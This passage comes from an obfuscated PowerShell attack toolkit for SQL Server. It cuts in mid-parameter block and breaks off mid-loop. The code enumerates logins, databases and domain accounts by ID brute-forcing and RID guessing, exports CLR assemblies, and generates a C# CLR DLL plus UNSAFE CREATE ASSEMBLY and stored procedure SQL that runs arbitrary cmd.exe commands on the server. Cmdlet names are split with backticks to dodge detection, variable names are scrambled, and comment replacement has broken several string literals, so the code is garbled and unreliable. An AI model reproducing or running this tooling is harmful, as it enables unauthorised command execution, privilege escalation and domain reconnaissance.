        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$MiddleWine,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$InsectErect,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $SwingPest = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $SwingPest.Columns.Add('ComputerName')
        $null = $SwingPest.Columns.Add('Instance')
        $null = $SwingPest.Columns.Add('DatabaseName')
        $null = $SwingPest.Columns.Add('assembly_id')
        $null = $SwingPest.Columns.Add('assembly_name')
        $null = $SwingPest.Columns.Add('file_id')
        $null = $SwingPest.Columns.Add('file_name')
        $null = $SwingPest.Columns.Add('clr_name')        
        $null = $SwingPest.Columns.Add('content')
        $null = $SwingPest.Columns.Add('permission_set_desc')
        $null = $SwingPest.Columns.Add('create_date')
        $null = $SwingPest.Columns.Add('modify_date')
        $null = $SwingPest.Columns.Add('is_user_defined')
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill  -EggsBead
        }
        else
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill
        }

        # Microsoft".
        if($MiddleWine){
            $SqueakRob = "WHERE af.name LIKE '%$MiddleWine%'"
        }else{
            $SqueakRob = ""
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Grabbing assembly file information from $FileSheep."
            }

            # Microsoft".
            $BoringLarge = "USE $FileSheep;
                      SELECT af.assembly_id,
 					  a.name as assembly_name,
                      af.file_id,					  	
					  af.name as file_name,
                      a.clr_name,
                      af.content, 
                      a.permission_set_desc,
                      a.create_date,
                      a.modify_date,
                      a.is_user_defined
                      FROM sys.assemblies a INNER JOIN sys.assembly_files af ON a.assembly_id = af.assembly_id 
                      $SqueakRob"

            # Microsoft".
            $HarshLewd = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $HarshLewd |
            ForEach-Object -Process {

                # Microsoft".
                $null = $SwingPest.Rows.Add(
                    [string]$HauntGusty,
                    [string]$Instance,
                    [string]$FileSheep,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.content,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.is_user_defined)
                
                # Microsoft".
                if($InsectErect){

                    # Microsoft".
                    $SnailsWar = "$InsectErect\CLRExports"
                    If ((test-path $SnailsWar) -eq $False){
                        Write-Verbose "$instance : Creating export folder: $SnailsWar"
                        $null = New-Item -Path "$SnailsWar" -type directory
                    }  
                    
                    # Microsoft".
                    $InstanceClean = $Instance -replace('\\','_')
                    $FadedBruise = "$SnailsWar\$InstanceClean"
                    If ((test-path $FadedBruise) -eq $False){
                        Write-Verbose "$instance : Creating server folder: $FadedBruise"
                        $null = New-Item -Path "$FadedBruise" -type directory
                    }                   

                    # Microsoft".
                    $LovingDark = "$FadedBruise\$FileSheep"
                    If ((test-path $LovingDark) -eq $False){
                        Write-Verbose "$instance : Creating database folder: $LovingDark"
                        $null = New-Item $LovingDark -type directory
                    } 

                    # Microsoft".
                    $WoozyRemove = $_.file_name
                    Write-Verbose "$instance : - Exporting $WoozyRemove.dll"
                    $FlightRoot = "$LovingDark\$WoozyRemove.dll"
                    $_.content | Set-Content -Encoding Byte $FlightRoot

                }                     
            }
        }
    }

    End
    {
        # Microsoft".
        $SwingPest
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLFuzzObjectName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$WoodenUgly = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$TemperPetite = 300,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $BladeLick = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating objects from object IDs..."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $WoodenUgly..$TemperPetite |
        ForEach-Object -Process {
            # Microsoft".
            $BoringLarge = "SELECT    '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [ObjectId],
            OBJECT_NAME($_) as [ObjectName]"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            $ObjectName = $TradeSpicy.ObjectName
            if( -not $RaggedQuill)
            {
                if($ObjectName.length -ge 2)
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: $ObjectName"
                }
                else
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: "
                }
            }

            # Microsoft".
            $BladeLick = $BladeLick + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $BladeLick | Where-Object -FilterScript {
            $_.ObjectName.length -ge 2
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLFuzzDatabaseName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$WoodenUgly = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$TemperPetite = 300,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TeamWeary = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating database names from database IDs..."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $WoodenUgly..$TemperPetite |
        ForEach-Object -Process {
            # Microsoft".
            $BoringLarge = "SELECT    '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [DatabaseId],
            DB_NAME($_) as [DatabaseName]"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            $AjarInnate = $TradeSpicy.DatabaseName
            if($AjarInnate.length -ge 2)
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to: $AjarInnate"
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to:"
                }
            }

            # Microsoft".
            $TeamWeary = $TeamWeary + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $TeamWeary | Where-Object -FilterScript {
            $_.DatabaseName.length -ge 2
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLFuzzServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$WoodenFoamy = 10000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Try to determine if the principal type is role, SQL login, or Windows account via error analysis of sp_defaultdb.')]
        [switch]$PickSparkElated,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $QuaintPlease = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $QuaintPlease.Columns.add('ComputerName')
        $null = $QuaintPlease.Columns.add('Instance')
        $null = $QuaintPlease.Columns.add('PrincipalId')
        $null = $QuaintPlease.Columns.add('PrincipleName')
        if($PickSparkElated)
        {
            $null = $QuaintPlease.Columns.add('PrincipleType')
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating principal names from $WoodenFoamy principal IDs.."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        # Microsoft".
        $BoringLarge = "
                SELECT 
                '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                n [PrincipalId], SUSER_NAME(n) as [PrincipleName]
                from ( 
                select top $WoodenFoamy row_number() over(order by t1.number) as N
                from   master..spt_values t1 
                       cross join master..spt_values t2
                ) a
                where SUSER_NAME(n) is not null"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TradeSpicy |
        ForEach-Object {

            # Microsoft".
            $BasinEnter = $_.PrincipleName
            $NuttyExpand = $_.PrincipalId

            if($PickSparkElated)
            {
                $ArchThaw = "EXEC master..sp_defaultdb '$BasinEnter', 'NOTAREALDATABASE1234ABCD'"
                $LiveKitty = Get-SQLQuery -Instance $Instance -BoringLarge $ArchThaw -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -RuralRing

                # Microsoft".
                if (($LiveKitty -like '*NOTAREALDATABASE*') -or ($LiveKitty -like '*alter the login*'))
                {

                    if($BasinEnter -like '*\*')
                    {
                        $FloatTempt = 'Windows Account'
                    }
                    else
                    {
                        $FloatTempt = 'SQL Login'
                    }
                }
                else
                {
                    $FloatTempt = 'SQL Server Role'
                }
            }

            # Microsoft".
            if($PickSparkElated)
            {
                $null = $QuaintPlease.Rows.Add($HauntGusty, $Instance, $NuttyExpand, $BasinEnter, $FloatTempt)
            }
            else
            {
                $null = $QuaintPlease.Rows.Add($HauntGusty, $Instance, $NuttyExpand, $BasinEnter)
            }

        }
    }

    End
    {
        # Microsoft".
        $QuaintPlease | Where-Object -FilterScript {
            $_.PrincipleName.length -ge 2
        }
        
        if( -not $RaggedQuill)
        {
            Write-Verbose -Message "$Instance : Complete."
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLFuzzDomainAccount
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$WoodenUgly = 500,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$TemperPetite = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Set a custom domain for user enumeration. Typically used to target trusted domains.')]
        [string]$WorryPlane,
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ShowBare = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $HauntGusty = $SmilePie.ComputerName
        $Instance = $SmilePie.Instance
        if(-not $WorryPlane){
            $WorryPlane = $SmilePie.DomainName
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : Enumerating Active Directory accounts for the `"$WorryPlane`" domain..."        

        # Microsoft".
        $MinuteStrong = "$WorryPlane\Domain Admins"         
        $RattySign = Get-SQLQuery -Instance $Instance -BoringLarge "select SUSER_SID('$MinuteStrong') as DomainGroupSid" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill            
        $BurstShake = $RattySign | Select-Object -Property domaingroupsid -ExpandProperty domaingroupsid       
        try{
            $PieCheat = [System.BitConverter]::ToString($BurstShake).Replace('-','').Substring(0,48)
        }catch{
            Write-Warning "The provided domain did not resolve correctly."
            return
        }

        # Microsoft".
        $WoodenUgly..$TemperPetite |
        ForEach-Object -Process {
            # Microsoft".
            $RotNippy = '{0:x}' -f $_

            # Microsoft".
            $YardSaw = $RotNippy | Measure-Object -Character
            $BleachMeek = $YardSaw.Characters

            # Microsoft".
            If([bool]($AdviceStory))
            {
                $CurlyLittle = "0$RotNippy"
            }

            # Microsoft".
            $NiceStage = $CurlyLittle -split '(..)' | Where-Object -FilterScript {
                $_
            }
            $TouchFork = $NiceStage | Sort-Object -Descending
            $DullMatter = $TouchFork -join ''

            # Microsoft".
            $SqueakTen = $DullMatter.PadRight(8,'0')

            # Microsoft".
            $SealGrubby = "0x$PieCheat$SqueakTen"

            # Microsoft".
            $BoringLarge = "SELECT    '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$SealGrubby' as [RID],
            SUSER_SNAME($SealGrubby) as [DomainAccount]"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            $FetchFuture = $TradeSpicy.DomainAccount
            if($FetchFuture.length -ge 2)
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : - RID $SealGrubby ($_) resolved to: $FetchFuture"
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : - RID $SealGrubby ($_) resolved to: "
                }
            }

            # Microsoft".
            $ShowBare = $ShowBare + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $ShowBare |
        Select-Object -Property ComputerName, Instance, DomainAccount -Unique |
        Where-Object -FilterScript {
            $_.DomainAccount -notlike ''
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-ComputerNameFromInstance
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Microsoft".
    If ($Instance)
    {
        $HauntGusty = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $HauntGusty = $env:COMPUTERNAME
    }

    Return $HauntGusty
}


Function  Get-SQLServiceLocal
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for running services.')]
        [switch]$GradeGiant,
                [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )
    Begin
    {
        # Microsoft".
        $EndWhite = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $EndWhite.Columns.Add('ComputerName')
        $null = $EndWhite.Columns.Add('Instance')
        $null = $EndWhite.Columns.Add('ServiceDisplayName')
        $null = $EndWhite.Columns.Add('ServiceName')
        $null = $EndWhite.Columns.Add('ServicePath')
        $null = $EndWhite.Columns.Add('ServiceAccount')
        $null = $EndWhite.Columns.Add('ServiceState')
        $null = $EndWhite.Columns.Add('ServiceProcessId')
    }

    Process
    {
        # Microsoft".
        $UnpackThick = Get-WmiObject -Class win32_service |
        Where-Object -FilterScript {
            $_.DisplayName -like 'SQL Server *'
        } |
        Select-Object -Property DisplayName, PathName, Name, StartName, State, SystemName, ProcessId

        # Microsoft".
        $UnpackThick |
        ForEach-Object -Process {
        
            # Microsoft".
            $HauntGusty = [string]$_.SystemName
            $ItchyRoot = [string]$_.DisplayName
            $MushyWander = [string]$_.State

            # Microsoft".
            $FlashyCrowd = $HauntGusty

            # Microsoft".
            $InstanceCheck = ($ItchyRoot[1..$ItchyRoot.Length] | Where-Object {$_ -like '('}).count
            if($InstanceCheck) {

                # Microsoft".
                $FlashyCrowd = $HauntGusty + '\' +$ItchyRoot.split('(')[1].split(')')[0]

                # Microsoft".
                if($FlashyCrowd -like '*\MSSQLSERVER')
                {
                    $FlashyCrowd = $HauntGusty
                }
            }
          
            # Microsoft".
            if($Instance -and $instance -notlike $FlashyCrowd){
                return
            }

            # Microsoft".
            if($GradeGiant -and $MushyWander -notlike 'Running'){
                return    
                
            }
            
            # Microsoft".
            if($_.ProcessId -eq 0){
                $SummerWind = ""
            }else{
                $SummerWind = $_.ProcessId
            }

            # Microsoft".
            $null = $EndWhite.Rows.Add(
                [string]$_.SystemName,
                [string]$FlashyCrowd,
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State,
                [string]$SummerWind)            
        }
    }

    End
    {
        # Microsoft".
        $SpookyLucky = $EndWhite.rows.count

        if(-not $RaggedQuill){
            Write-Verbose "$SpookyLucky local SQL Server services were found that matched the criteria."        
        }

        # Microsoft".
        $EndWhite 
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Create-SQLFileCLRDll
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Procedure name.')]
        [string]$PageMarch = "cmd_exec",  

        [Parameter(Mandatory = $false,
        HelpMessage = 'Directory to output files.')]
        [string]$SilverDrink = $env:temp, 

        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly name. It is random by default.')]
        [string]$MiddleWine, 
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly class name. It is random by default.')]
        [string]$ScreamStir,    
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly method name. It is random by default.')]
        [string]$LongPour,             

        [Parameter(Mandatory = $false,
        HelpMessage = 'Output name.')]
        [string]$EightPlease = "CLRFile",
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Optional source DLL to convert to ascii hex.')]
        [string]$AdmireLick
    )

    Begin
    {

        # Microsoft".
        # Microsoft".
        # Microsoft".
        $SpoonStormy = $SilverDrink + '\' + $EightPlease + '.csc'
        $YakWary = $SilverDrink + '\' + $EightPlease + '.dll'
        $SongsErect = $SilverDrink + '\' + $EightPlease + '.txt'

        # Microsoft".
        if($AdmireLick){
            $YakWary = $AdmireLick
            $SpoonStormy = "NA"
        }
    }

    Process 
    {

        # Microsoft".
        Write-Verbose "Target C# Microsoft".
        Write-Verbose "Target DLL File: $YakWary"
        
        # Microsoft".
        $AmuseAcidic = (5..10 | Get-Random -count 1 )
        $MilkGrass = (5..10 | Get-Random -count 1 )
        $PinchBattle = (5..10 | Get-Random -count 1 )

        # Microsoft".
        If(-not $ScreamStir){                                       
            $ScreamStir = (-join ((65..90) + (97..122) | Get-Random -Count $AmuseAcidic | % {[char]$_}))
        }

        # Microsoft".
        if(-not $LongPour){
            $LongPour = (-join ((65..90) + (97..122) | Get-Random -Count $MilkGrass | % {[char]$_}))
        }

        # Microsoft".
        If(-not $MiddleWine){
            $MiddleWine = (-join ((65..90) + (97..122) | Get-Random -Count $MilkGrass | % {[char]$_}))
        }

        if (-not $AdmireLick){
            # Microsoft".
            # Microsoft".
            $RatTown = @"
            using System;
            using System.Data;
            using System.Data.SqlClient;
            using System.Data.SqlTypes;
            using Microsoft.SqlServer.Server;
            using System.IO;
            using System.Diagnostics;
            using System.Text;
            public partial class $ScreamStir
            {
            [Microsoft.SqlServer.Server.SqlProcedure]
            public static void $LongPour (SqlString execCommand)
            {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();

                // Create the record and specify the metadata for the columns.
	            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	            // Mark the begining of the result-set.
	            SqlContext.Pipe.SendResultsStart(record);

                // Set values for each column in the row
	            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

	            // Send the row back to the client.
	            SqlContext.Pipe.SendResultsRow(record);

	            // Mark the end of the result-set.
	            SqlContext.Pipe.SendResultsEnd();

            proc.WaitForExit();
            proc.Close();

            }
            };
"@

            # Microsoft".
            Write-Verbose "Writing C# Microsoft".
            $RatTown | `out`-f`i`le $SpoonStormy

            # Microsoft".
            Write-Verbose "Searching for csc.exe..." 
            $AnimalRoyal = Get-ChildItem -Recurse "C:\Windows\Microsoft.NET\" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
            if(-not $AnimalRoyal){
                Write-CrazyChief "No csc.exe found."
                return
            }else{
                Write-Verbose "csc.exe found."
            }
            
            $LoadTree = pwd
            cd $SilverDrink
            $SoakSame = "$AnimalRoyal /target:library " + $SpoonStormy                   
            # Microsoft".
            Write-Verbose "Compiling to dll..."
            $FlyCruel = inv`oke`-ex`pre`s`s`ion $SoakSame
            cd $LoadTree
        }
        
        # Microsoft".
        Write-Verbose "Grabbing bytes from the dll" 
        if (-not $AdmireLick){

            # Microsoft".
            $MindYummy = "$PageMarch"
            $CloudyHead = ne`w`-ob`je`ct -Type System.Text.StringBuilder
            $CloudyHead.Append("CREATE ASSEMBLY [") > $null
            $CloudyHead.Append($MiddleWine) > $null
            $CloudyHead.Append("] AUTHORIZATION [dbo] FROM `n0x") > $null
            $FieldCrayon = resolve-path $YakWary
            $fileStream = [IO.File]::OpenRead($FieldCrayon)
             while (($byte = $fileStream.ReadByte()) -gt -1) {
                $CloudyHead.Append($byte.ToString("X2")) > $null
            }
            $null = $CloudyHead.AppendLine("`nWITH PERMISSION_SET = UNSAFE")
            $null = $CloudyHead.AppendLine("GO")
            $null = $CloudyHead.AppendLine("CREATE PROCEDURE [dbo].[$MindYummy] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$MiddleWine].[$ScreamStir].[$LongPour];")
            $null = $CloudyHead.AppendLine("GO")
            $null = $CloudyHead.AppendLine("EXEC[dbo].[$MindYummy] 'whoami'")        
            $null = $CloudyHead.AppendLine("GO")
            $RapidBang = $CloudyHead.ToString() -join ""
            $fileStream.Close()
            $fileStream.Dispose()
        }else{
            
            # Microsoft".
            $CloudyHead = ne`w`-ob`je`ct -Type System.Text.StringBuilder
            $null = $CloudyHead.AppendLine("-- Change the assembly name to the one you want to replace")  
            $null = $CloudyHead.AppendLine("ALTER ASSEMBLY [TBD] FROM")
            $null = $CloudyHead.Append("`n0x") 
            $FieldCrayon = resolve-path $YakWary
            $fileStream = [IO.File]::OpenRead($FieldCrayon)
             while (($byte = $fileStream.ReadByte()) -gt -1) {
